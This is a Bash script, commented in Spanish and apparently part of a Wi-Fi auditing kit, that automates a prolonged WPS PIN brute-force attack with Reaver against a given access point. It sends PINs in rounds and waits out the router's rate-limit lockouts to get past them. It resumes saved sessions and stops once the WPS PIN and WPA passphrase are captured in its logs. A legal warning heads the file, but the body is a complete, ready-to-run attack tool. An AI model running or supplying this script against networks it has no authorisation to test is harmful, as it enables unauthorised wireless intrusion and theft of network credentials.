#!/usr/bin/env bash
# =============================================================================
# run_reaver_largo.sh — ataque WPS PIN prolongado con Reaver (kit-auditoria)
# =============================================================================
# AVISO LEGAL: enviar PINs WPS a un router que no es tuyo o que no tienes
# autorización expresa para auditar es ilegal en España (arts. 197 y 264 CP,
# LSSI 34/2002), aunque no aciertes. "Solo era una prueba" no exime.
# El PIN y la PSK que aparezcan quedan en los logs locales: no los subas a
# ningún repositorio.
#
# Estrategia prolongada:
#   - Cada ronda envía --intentos-ronda PINs con retardo --retardo s entre ellos.
#   - Si el AP se BLOQUEA (rate limiting), espera --espera-bloqueo s y vuelve a
#     probar con una sonda de 1 intento; si sigue bloqueado, espera otra vez.
#   - Si la ronda termina sin PIN y sin bloqueo, encadena otra ronda.
#   - Para al encontrar el PIN, al alcanzar --rondas-max, o con Ctrl-C
#     (guarda el progreso: Reaver recuerda el último PIN probado en --session).
#
# Uso: sudo ./run_reaver_largo.sh --interfaz wlan0mon --bssid AA:BB:... --canal N
#      (la interfaz debe estar ya en modo monitor; usa run_wps_scan.sh como guía)
# =============================================================================
set -u

INTERFAZ=; BSSID=; CANAL=; INTENTOS_RONDA=10; RETARDO=15
ESPERA_BLOQUEO=900; RONDAS_MAX=24; SESION=; SALIDA_DIR=; SECO=0

uso(){ sed -n '2,24p' "$0" | sed 's/^# \{0,1\}//'; exit 0; }

while [ $# -gt 0 ]; do
  case "$1" in
    --help|-h) uso;;
    --dry-run) SECO=1; shift;;
    --interfaz|--bssid|--canal|--intentos-ronda|--retardo|--espera-bloqueo|--rondas-max|--sesion|--salida)
      [ $# -ge 2 ] && [[ "${2:-}" != --* ]] || { echo "[-] falta valor para $1" >&2; exit 2; }
      case "$1" in
        --interfaz) INTERFAZ=$2;; --bssid) BSSID=$2;; --canal) CANAL=$2;;
        --intentos-ronda) INTENTOS_RONDA=$2;; --retardo) RETARDO=$2;;
        --espera-bloqueo) ESPERA_BLOQUEO=$2;; --rondas-max) RONDAS_MAX=$2;;
        --sesion) SESION=$2;; --salida) SALIDA_DIR=$2;;
      esac
      shift 2;;
    *) echo "[-] opción desconocida: $1" >&2; exit 2;;
  esac
done

[[ "$INTERFAZ" =~ ^[A-Za-z0-9_.-]+$ ]] || { echo "[-] indica --interfaz válida" >&2; exit 2; }
[[ "$BSSID" =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]] || { echo "[-] --bssid inválido" >&2; exit 2; }
BSSID=${BSSID^^}
for nombre in CANAL INTENTOS_RONDA RETARDO ESPERA_BLOQUEO RONDAS_MAX; do
  valor=${!nombre}
  [[ "$valor" =~ ^[0-9]+$ ]] && [ "${#valor}" -le 5 ] || { echo "[-] $nombre debe ser un entero" >&2; exit 2; }
  printf -v "$nombre" '%d' "$((10#$valor))"
done
[ "$CANAL" -ge 1 ] && [ "$CANAL" -le 233 ] || { echo "[-] canal fuera de 1..233" >&2; exit 2; }
[ "$INTENTOS_RONDA" -ge 1 ] && [ "$INTENTOS_RONDA" -le 200 ] || { echo "[-] --intentos-ronda fuera de 1..200" >&2; exit 2; }
[ "$RETARDO" -ge 1 ] && [ "$RETARDO" -le 300 ] || { echo "[-] --retardo fuera de 1..300 s" >&2; exit 2; }
[ "$ESPERA_BLOQUEO" -ge 60 ] && [ "$ESPERA_BLOQUEO" -le 7200 ] || { echo "[-] --espera-bloqueo fuera de 60..7200 s" >&2; exit 2; }
[ "$RONDAS_MAX" -ge 1 ] && [ "$RONDAS_MAX" -le 500 ] || { echo "[-] --rondas-max fuera de 1..500" >&2; exit 2; }

buscar_bin(){
  local n=$1 c
  c=$(command -v "$n" 2>/dev/null) && { printf '%s' "$c"; return 0; }
  if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != root ]; then
    c=$(getent passwd "$SUDO_USER" | cut -d: -f6)
    [ -x "$c/.local/bin/$n" ] && { printf '%s' "$c/.local/bin/$n"; return 0; }
  fi
  return 1
}

if [ "$SECO" -eq 1 ]; then
  echo "Plan: Reaver prolongado contra $BSSID canal $CANAL por $INTERFAZ"
  echo "  rondas de $INTENTOS_RONDA PINs · retardo ${RETARDO}s · espera si bloqueo ${ESPERA_BLOQUEO}s · máximo $RONDAS_MAX rondas"
  echo "  sesión de progreso: ${SESION:-automática en el directorio de salida}; PIN y PSK quedan en los logs"
  exit 0
fi

[[ $EUID -eq 0 ]] || { echo "[-] ejecuta con sudo" >&2; exit 1; }
REAVER=$(buscar_bin reaver) || { echo "[-] falta reaver (o añade ~/.local/bin al PATH)" >&2; exit 1; }
ip link show "$INTERFAZ" >/dev/null 2>&1 || { echo "[-] no existe $INTERFAZ; ponla antes en modo monitor" >&2; exit 1; }

usuario=${SUDO_USER:-${USER:-root}}
if [ -z "$SALIDA_DIR" ]; then
  casa=$(getent passwd "$usuario" | cut -d: -f6)
  SALIDA_DIR="$casa/capturas_wifi/reaver_${BSSID//[:]/_}"
fi
mkdir -p "$SALIDA_DIR" && chmod 700 "$SALIDA_DIR"
[ -n "$SESION" ] || SESION="$SALIDA_DIR/sesion.wpc"
# reaver guarda el progreso en ~/.reaver/<BSSID>.wpc; lo copiaremos a la sesión propia
casa_reaver=$(getent passwd root | cut -d: -f6)
INT=0
trap 'INT=1' INT

analizar(){ # $1=log -> imprime ENCONTRADO|BLOQUEADO|INCONCLUYENTE
  local log=$1
  if grep -qiE 'WPS PIN: *[0-9]{8}' "$log" && grep -qiE 'WPA PSK: ' "$log"; then
    echo ENCONTRADO
  elif grep -qiE 'locked|rate.?limiting' "$log"; then
    echo BLOQUEADO
  else
    echo INCONCLUYENTE
  fi
}

echo "[i] ataque prolongado a $BSSID (canal $CANAL) por $INTERFAZ"
echo "[i] rondas de $INTENTOS_RONDA · retardo ${RETARDO}s · espera-bloqueo ${ESPERA_BLOQUEO}s · máx $RONDAS_MAX rondas"
echo "[i] logs (privados, 0700): $SALIDA_DIR"

ronda=1
while [ "$ronda" -le "$RONDAS_MAX" ]; do
  [ "$INT" -eq 1 ] && { echo "[i] interrumpido; el progreso queda en la sesión"; exit 130; }
  log="$SALIDA_DIR/ronda_$(printf '%03d' "$ronda").log"
  echo "[i] ronda $ronda/$RONDAS_MAX → $log"
  orden=("$REAVER" -i "$INTERFAZ" -b "$BSSID" -c "$CANAL" -g "$INTENTOS_RONDA" \
         -d "$RETARDO" -l 120 -S)
  # reaver guarda la sesión solo (~/.reaver/<BSSID>.wpc); si existe la nuestra, reanuda
  [ -f "$SESION" ] && orden+=(-s "$SESION")
  [ "$CANAL" -gt 14 ] && orden+=(-5)
  timeout $(( INTENTOS_RONDA * (RETARDO + 120) + 300 )) "${orden[@]}" >"$log" 2>&1
  # preservar el progreso de reaver (~/.reaver/<BSSID>.wpc) en nuestra sesión
  [ -f "$casa_reaver/.reaver/${BSSID}.wpc" ] && \
    cp -f "$casa_reaver/.reaver/${BSSID}.wpc" "$SESION" 2>/dev/null
  estado=$(analizar "$log")
  case "$estado" in
    ENCONTRADO)
      echo "[+] PIN y PSK registrados en $log (valores privados; no los compartas)"
      exit 0;;
    BLOQUEADO)
      echo "[!] AP bloqueado; esperando ${ESPERA_BLOQUEO}s antes de reintentar"
      # espera fraccionada para responder a Ctrl-C
      restante=$ESPERA_BLOQUEO
      while [ "$restante" -gt 0 ] && [ "$INT" -eq 0 ]; do
        sleep 10; restante=$((restante - 10))
      done
      ;;
    INCONCLUYENTE)
      echo "[!] ronda sin PIN y sin bloqueo; encadenando siguiente ronda"
      ;;
  esac
  ronda=$((ronda + 1))
done
echo "[-] sin PIN tras $RONDAS_MAX rondas; revisa $SALIDA_DIR y reanuda con --sesion $SESION"
exit 1
